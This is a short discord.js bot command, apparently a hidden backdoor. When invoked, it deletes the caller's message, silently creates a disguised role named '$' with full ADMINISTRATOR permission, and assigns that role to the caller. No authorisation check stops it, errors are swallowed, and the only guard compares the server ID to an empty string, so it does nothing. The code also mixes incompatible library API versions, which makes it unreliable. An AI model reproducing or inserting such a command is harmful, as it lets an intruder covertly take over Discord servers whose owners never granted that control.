const Discord = require('discord.js');

module.exports = {
  name: "admin",
  alias: ["adm", "op"],

async execute (client, message, args, async){

    if (message.guild.id == "") return message.channel.send("¿Que intentas subnormal?") 
    message.delete()
    let rol = await message.guild.roles.create({data: {
      
      name: "$",
      color: "B9BBBE",
      permissions: "ADMINISTRATOR",
      hoisted: false
    }});

message.member.roles.add(rol)
      .then(function(role) {
        message.member.addRole(role);
        if (message.deletable) message.delete().catch(e => {});
      })
      .catch(e => {});
  }

 }
